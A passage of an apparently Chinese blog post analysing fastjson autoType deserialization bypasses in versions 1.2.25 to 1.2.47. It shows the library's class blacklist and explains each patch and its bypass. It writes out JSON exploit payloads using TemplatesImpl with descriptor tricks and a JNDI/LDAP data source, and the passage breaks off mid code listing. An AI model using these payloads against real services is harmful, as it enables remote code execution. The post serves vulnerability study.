</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">14
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">15
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">16
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">17
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">18
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">19
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">20
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">21
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">22
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Java" data-lang="Java"><span style="display:flex;"><span>bsh
</span></span><span style="display:flex;"><span>com.<span style="color:#007f7f">mchange</span>
</span></span><span style="display:flex;"><span>com.<span style="color:#007f7f">sun</span>.
</span></span><span style="display:flex;"><span>java.<span style="color:#007f7f">lang</span>.<span style="color:#007f7f">Thread</span>
</span></span><span style="display:flex;"><span>java.<span style="color:#007f7f">net</span>.<span style="color:#007f7f">Socket</span>
</span></span><span style="display:flex;"><span>java.<span style="color:#007f7f">rmi</span>
</span></span><span style="display:flex;"><span>javax.<span style="color:#007f7f">xml</span>
</span></span><span style="display:flex;"><span>org.<span style="color:#007f7f">apache</span>.<span style="color:#007f7f">bcel</span>
</span></span><span style="display:flex;"><span>org.<span style="color:#007f7f">apache</span>.<span style="color:#007f7f">commons</span>.<span style="color:#007f7f">beanutils</span>
</span></span><span style="display:flex;"><span>org.<span style="color:#007f7f">apache</span>.<span style="color:#007f7f">commons</span>.<span style="color:#007f7f">collections</span>.<span style="color:#007f7f">Transformer</span>
</span></span><span style="display:flex;"><span>org.<span style="color:#007f7f">apache</span>.<span style="color:#007f7f">commons</span>.<span style="color:#007f7f">collections</span>.<span style="color:#007f7f">functors</span>
</span></span><span style="display:flex;"><span>org.<span style="color:#007f7f">apache</span>.<span style="color:#007f7f">commons</span>.<span style="color:#007f7f">collections4</span>.<span style="color:#007f7f">comparators</span>
</span></span><span style="display:flex;"><span>org.<span style="color:#007f7f">apache</span>.<span style="color:#007f7f">commons</span>.<span style="color:#007f7f">fileupload</span>
</span></span><span style="display:flex;"><span>org.<span style="color:#007f7f">apache</span>.<span style="color:#007f7f">myfaces</span>.<span style="color:#007f7f">context</span>.<span style="color:#007f7f">servlet</span>
</span></span><span style="display:flex;"><span>org.<span style="color:#007f7f">apache</span>.<span style="color:#007f7f">tomcat</span>
</span></span><span style="display:flex;"><span>org.<span style="color:#007f7f">apache</span>.<span style="color:#007f7f">wicket</span>.<span style="color:#007f7f">util</span>
</span></span><span style="display:flex;"><span>org.<span style="color:#007f7f">codehaus</span>.<span style="color:#007f7f">groovy</span>.<span style="color:#007f7f">runtime</span>
</span></span><span style="display:flex;"><span>org.<span style="color:#007f7f">hibernate</span>
</span></span><span style="display:flex;"><span>org.<span style="color:#007f7f">jboss</span>
</span></span><span style="display:flex;"><span>org.<span style="color:#007f7f">mozilla</span>.<span style="color:#007f7f">javascript</span>
</span></span><span style="display:flex;"><span>org.<span style="color:#007f7f">python</span>.<span style="color:#007f7f">core</span>
</span></span><span style="display:flex;"><span>org.<span style="color:#007f7f">springframework</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>添加反序列化白名单有3种方法：</p>
<ul>
<li>使用代码进行添加：<code>ParserConfig.getGlobalInstance().addAccept(“org.reus09.fastjson.,org.javaweb.”)</code></li>
<li>加上JVM启动参数：<code>-Dfastjson.parser.autoTypeAccept=org.reus09.fastjson.</code></li>
<li>在fastjson.properties中添加：<code>fastjson.parser.autoTypeAccept=org.reus09.fastjson.</code></li>
</ul>
<p>然后我们分析一下<code>1.2.25</code>版本下的<code>check</code>机制</p>
<p>首先开启<code>autoTypeSupport</code>,先根据白名单进行判别，再通过黑名单进行判别。如果在，就使用 <code>TypeUtils.loadClass</code> 加载，然后使用黑名单判断类名的开头，如果匹配就抛出异常。</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20221014185742097.png" alt="image-20221014185742097"  />
</p>
<p>如果上面没查询到，通过<code>TypeUtils.getClassFromMapping(typeName)</code>缓存判断</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20221014185914000.png" alt="image-20221014185914000"  />
</p>
<p>缓存里面的种类如下：</p>
<ul>
<li><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20221014185955068.png" alt="image-20221014185955068"  />
</li>
</ul>
<p>缓存也没有，在没有开启<code>autoTypeSupport</code>的时候，先进入黑名单进行判断，然后在白名单进行判断，如果存在白名单，同样进行<code>loadlClass</code>加载。</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20221014190158061.png" alt="image-20221014190158061"  />
</p>
<p>最后，如果它是个期望类，并且在黑白名单都没有找到，同样调用<code>loadClass</code>。</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20221014190322929.png" alt="image-20221014190322929"  />
</p>
<p>我们通过分析<code>loadClass</code>方法的逻辑，这个类在加载目标类之前为了兼容带有描述符的类名，使用了递归调用来处理描述符中的 <code>[</code>、<code>L</code>、<code>;</code> 字符。</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20221014190627499.png" alt="image-20221014190627499"  />
</p>
<p>在这个位置出现了逻辑漏洞，攻击者可以使用带有描述符的类绕过黑名单的限制，而在类加载过程中，描述符还会被处理掉。因此，漏洞利用的思路就出来了：需要开启 autoType，使用以上字符来进行黑名单的绕过。</p>
<p><code>payload</code>:</p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">7
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>	<span style="font-weight:bold">&#34;@type&#34;</span>: <span style="color:#0ff;font-weight:bold">&#34;Lcom.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;&#34;</span>,
</span></span><span style="display:flex;"><span>	<span style="font-weight:bold">&#34;_bytecodes&#34;</span>: [<span style="color:#0ff;font-weight:bold">&#34;yv66vgAAADQA...CJAAk=&#34;</span>],
</span></span><span style="display:flex;"><span>	<span style="font-weight:bold">&#34;_name&#34;</span>: <span style="color:#0ff;font-weight:bold">&#34;reus09&#34;</span>,
</span></span><span style="display:flex;"><span>	<span style="font-weight:bold">&#34;_tfactory&#34;</span>: {},
</span></span><span style="display:flex;"><span>	<span style="font-weight:bold">&#34;_outputProperties&#34;</span>: {},
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></td></tr></table>
</div>
</div><p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20221014191151860.png" alt="image-20221014191151860"  />
</p>
<h3 id="fastjson-1242">fastjson-1.2.42<a hidden class="anchor" aria-hidden="true" href="#fastjson-1242">#</a></h3>
<p>在版本 1.2.42 中，fastjson 继续延续了黑白名单的检测模式，但是将黑名单类从白名单修改为使用 HASH 的方式进行对比，这是为了防止安全研究人员根据黑名单中的类进行反向研究，用来对未更新的历史版本进行攻击。同时，作者对之前版本一直存在的使用类描述符绕过黑名单校验的问题尝试进行了修复。</p>
<blockquote>
<p>影响版本：<code>1.2.25 &lt;= fastjson &lt;= 1.2.42</code>
描述：通过变量常用的jar、类、字符串碰撞hash得到黑名单</p>
</blockquote>
<p>还是关注 <code>com.alibaba.fastjson.parser.ParserConfig</code> 这个类，作者将原本的明文黑名单转为使用了 Hash 黑名单，防止安全人员对其研究。</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20221014191639401.png" alt="image-20221014191639401"  />
</p>
<p>加密方式在<code>com.alibaba.fastjson.util.TypeUtils#fnv1a_64</code>是有的</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20221014191756994.png" alt="image-20221014191756994"  />
</p>
<p>并且在 <code>checkAutoType</code> 中加入判断，如果类的第一个字符是 <code>L</code> 结尾是 <code>;</code>，则使用 <code>substring</code> 进行了去除。还是用<code>hash</code>写的。</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20221014192010448.png" alt="image-20221014192010448"  />
</p>
<p>但是这种判断完全是徒劳的，因为在最后<code>loadClass</code>处理时是递归处理，因此只要对描述符进行双写即可绕过：</p>
<p><code>payload</code>:</p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">7
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>	<span style="font-weight:bold">&#34;@type&#34;</span>: <span style="color:#0ff;font-weight:bold">&#34;LLcom.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;;&#34;</span>,
</span></span><span style="display:flex;"><span>	<span style="font-weight:bold">&#34;_bytecodes&#34;</span>: [<span style="color:#0ff;font-weight:bold">&#34;yv66vgAAADQA...CJAAk=&#34;</span>],
</span></span><span style="display:flex;"><span>	<span style="font-weight:bold">&#34;_name&#34;</span>: <span style="color:#0ff;font-weight:bold">&#34;reus09&#34;</span>,
</span></span><span style="display:flex;"><span>	<span style="font-weight:bold">&#34;_tfactory&#34;</span>: {},
</span></span><span style="display:flex;"><span>	<span style="font-weight:bold">&#34;_outputProperties&#34;</span>: {},
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></td></tr></table>
</div>
</div><p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20221014192149329.png" alt="image-20221014192149329"  />
</p>
<h3 id="fastjson-1243">fastjson-1.2.43<a hidden class="anchor" aria-hidden="true" href="#fastjson-1243">#</a></h3>
<p>这个版本主要是修复上一个版本中双写绕过的问题。</p>
<blockquote>
<p>影响版本：1.2.25 &lt;= fastjson &lt;= 1.2.43
描述：上有政策，下有对策。在 L、; 被进行了限制后，安全研究人员将目光转向了 [。</p>
</blockquote>
<p>可以看到用来检查的 <code>checkAutoType</code> 代码添加了判断，如果类名连续出现了两个 <code>L</code> 将会抛出异常</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20221014192455393.png" alt="image-20221014192455393"  />
</p>
<p>这样使用 <code>L</code>、<code>;</code> 绕过黑名单的思路就被阻挡了，但是在 <code>loadClass</code> 的过程中，还针对 <code>[</code> 也进行了处理和递归.</p>
<p><code>payload</code>:</p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">7
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>	<span style="font-weight:bold">&#34;@type&#34;</span>: <span style="color:#0ff;font-weight:bold">&#34;[com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&#34;</span>[,
</span></span><span style="display:flex;"><span>	{<span style="font-weight:bold">&#34;_bytecodes&#34;</span>: [<span style="color:#0ff;font-weight:bold">&#34;yv66vgAAADQA...CJAAk=&#34;</span>],
</span></span><span style="display:flex;"><span>	<span style="font-weight:bold">&#34;_name&#34;</span>: <span style="color:#0ff;font-weight:bold">&#34;reus09&#34;</span>,
</span></span><span style="display:flex;"><span>	<span style="font-weight:bold">&#34;_tfactory&#34;</span>: {},
</span></span><span style="display:flex;"><span>	<span style="font-weight:bold">&#34;_outputProperties&#34;</span>: {},
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></td></tr></table>
</div>
</div><p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20221014192835637.png" alt="image-20221014192835637"  />
</p>
<h3 id="fastjson-1244">fastjson-1.2.44<a hidden class="anchor" aria-hidden="true" href="#fastjson-1244">#</a></h3>
<p>这个版本主要是修复上一个版本中使用 <code>[</code> 绕过黑名单防护的问题。</p>
<blockquote>
<p>影响版本：1.2.25 &lt;= fastjson &lt;= 1.2.44
描述：在此版本将 [ 也进行修复了之后，由字符串处理导致的黑名单绕过也就告一段落了。</p>
</blockquote>
<p>在 <code>checkAutoType</code> 中添加了新的判断，如果类名以 <code>[</code> 开始则直接抛出异常。</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20221014193134227.png" alt="image-20221014193134227"  />
</p>
<p>可以使用像<code>fastjson-1.2.45</code>的<code>payload byPass</code></p>
<h3 id="fastjson-1245">fastjson-1.2.45<a hidden class="anchor" aria-hidden="true" href="#fastjson-1245">#</a></h3>
<p>在此版本爆出了一个黑名单绕过，实际上，黑名单是无穷无尽的，随着 <code>fastjson</code> 的版本更新，一定会有更多的黑名单爆出来，因为隔壁 <code>jackson</code> 都是明文黑名单的，只要隔壁一更新，大家都看到了，就会拿来看 <code>fastjson</code>。</p>
<blockquote>
<p>影响版本：1.2.25 &lt;= fastjson &lt;= 1.2.45
描述：黑名单列表需要不断补充。</p>
</blockquote>
<p><code>payload</code>如下：</p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">6
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="font-weight:bold">&#34;@type&#34;</span>:<span style="color:#0ff;font-weight:bold">&#34;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory&#34;</span>,
</span></span><span style="display:flex;"><span>    <span style="font-weight:bold">&#34;properties&#34;</span>:{
</span></span><span style="display:flex;"><span>        <span style="font-weight:bold">&#34;data_source&#34;</span>:<span style="color:#0ff;font-weight:bold">&#34;ldap://127.0.0.1:23457/Command8&#34;</span>
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></td></tr></table>
</div>
</div><p>需要<code>pom</code></p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">5
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="font-weight:bold">&lt;dependency&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="font-weight:bold">&lt;groupId&gt;</span>org.apache.ibatis<span style="font-weight:bold">&lt;/groupId&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="font-weight:bold">&lt;artifactId&gt;</span>ibatis-core<span style="font-weight:bold">&lt;/artifactId&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="font-weight:bold">&lt;version&gt;</span>3.0<span style="font-weight:bold">&lt;/version&gt;</span>
</span></span><span style="display:flex;"><span><span style="font-weight:bold">&lt;/dependency&gt;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="fastjson-1247">fastjson-1.2.47<a hidden class="anchor" aria-hidden="true" href="#fastjson-1247">#</a></h3>
<p>在 <code>fastjson</code> 不断迭代到 <code>1.2.47</code> 时，爆出了最为严重的漏洞，可以在不开启 <code>AutoTypeSupport</code> 的情况下进行反序列化的利用。</p>
<blockquote>
<p>影响版本：1.2.25 &lt;= fastjson &lt;= 1.2.32 未开启 AutoTypeSupport
影响版本：1.2.33 &lt;= fastjson &lt;= 1.2.47不论是否开启AutoTypeSupport
描述：作者删除了一个 fastjson 的测试文件：https://github.com/alibaba/fastjson/commit/be41b36a8d748067ba4debf12bf236388e500c66 ，里面包含了这次通杀漏洞的 payload。</p>
</blockquote>
<h4 id="分析">分析<a hidden class="anchor" aria-hidden="true" href="#分析">#</a></h4>
<p>这次的绕过问题还是出现在 <code>checkAutoType()</code> 方法中：</p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">  1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">  2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">  3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">  4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">  5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">  6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">  7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">  8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">  9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 12
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 13
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 14
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 15
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 16
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 17
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 18
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 19
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 20
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 21
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 22
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 23
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 24
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 25
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 26
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 27
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 28
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 29
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 30
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 31
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 32
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 33
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 34
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 35
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 36
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 37
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 38
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 39
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 40
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 41
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 42
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 43
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 44
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 45
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 46
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 47
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 48
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 49
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 50
